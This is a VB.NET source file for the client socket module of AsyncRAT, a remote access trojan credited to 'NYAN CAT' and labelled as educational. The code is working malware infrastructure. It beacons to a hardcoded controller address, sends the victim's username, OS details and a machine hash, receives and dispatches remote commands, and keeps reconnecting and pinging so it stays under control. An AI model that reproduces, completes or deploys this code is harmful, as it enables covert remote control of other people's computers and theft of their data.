﻿Imports System.Net
Imports System.Net.Sockets
Imports System.IO

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

Public Class ClientSocket

    Public Shared isConnected As Boolean = False
    Public Shared S As Socket
    Public Shared BufferLength As Long = Nothing
    Public Shared Buffer() As Byte
    Public Shared MS As New MemoryStream
    Public Shared SPL As String = "<NYANxCAT>"

    Public Shared Sub BeginConnect()

        Try
            Threading.Thread.Sleep(2500)
            S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

            Dim ipAddress As IPAddress = IPAddress.Parse("127.0.0.1")
            Dim ipEndPoint As IPEndPoint = New IPEndPoint(ipAddress, 5656)

            BufferLength = -1
            Buffer = New Byte(0) {}
            MS = New MemoryStream

            S.ReceiveBufferSize = 1024 * 500
            S.SendBufferSize = 1024 * 500

            S.Connect(ipEndPoint)

            isConnected = True
            Send(Info)

            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)

        Catch ex As Exception
            isDisconnected()
        End Try
    End Sub

    Private Shared Function Info()

        Dim OS As New Devices.ComputerInfo
        Return String.Concat("INFO", SPL, GetHash(ID), SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "AsyncClient v0.1")

    End Function

    Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
        If isConnected = False Then isDisconnected()
        Try
            Dim Received As Integer = S.EndReceive(ar)
            If Received > 0 Then
                If BufferLength = -1 Then
                    If Buffer(0) = 0 Then
                        BufferLength = BS(MS.ToArray)
                        MS.Dispose()
                        MS = New MemoryStream

                        If BufferLength = 0 Then
                            BufferLength = -1
                            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
                        End If
                        Buffer = New Byte(BufferLength - 1) {}
                    Else
                        MS.WriteByte(Buffer(0))
                    End If
                Else
                    MS.Write(Buffer, 0, Received)
                    If (MS.Length = BufferLength) Then
                        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf BeginRead), MS.ToArray)
                        BufferLength = -1
                        MS.Dispose()
                        MS = New MemoryStream
                        Buffer = New Byte(0) {}
                    Else
                        Buffer = New Byte(BufferLength - MS.Length - 1) {}
                    End If
                End If
            Else
                isDisconnected()
            End If
            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
        Catch ex As Exception
            isDisconnected()
        End Try
    End Sub

    Public Shared Sub BeginRead(ByVal b As Byte())
        Try
            Messages.Read(b)
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub Send(ByVal msg As String)
        Try
            Dim MS As New MemoryStream
            Dim B As Byte() = SB(msg)
            Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

            MS.Write(L, 0, L.Length)
            MS.Write(B, 0, B.Length)

            S.Poll(-1, SelectMode.SelectWrite)
            S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)

            MS.Flush()
            MS.Dispose()
        Catch ex As Exception
            isDisconnected()
        End Try
    End Sub

    Private Shared Sub EndSend(ByVal ar As IAsyncResult)
        Try
            S.EndSend(ar)
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub isDisconnected()
        isConnected = False

        Try
            If S IsNot Nothing Then
                S.Close()
                S.Dispose()
                S = Nothing
            End If
        Catch ex As Exception
        End Try

        Try
            If MS IsNot Nothing Then
                MS.Dispose()
                MS = Nothing
            End If
        Catch ex As Exception
        End Try

        BeginConnect()

    End Sub

    Public Shared Sub Ping()
        While True
            Threading.Thread.Sleep(30 * 1000)
            Try
                If S.Connected Then
                    Dim MS As New MemoryStream
                    Dim B As Byte() = SB("PING?")
                    Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

                    MS.Write(L, 0, L.Length)
                    MS.Write(B, 0, B.Length)

                    S.Poll(-1, SelectMode.SelectWrite)
                    S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)

                    MS.Flush()
                    MS.Dispose()
                End If
            Catch ex As Exception
                isConnected = False
                End Try
        End While
    End Sub


End Class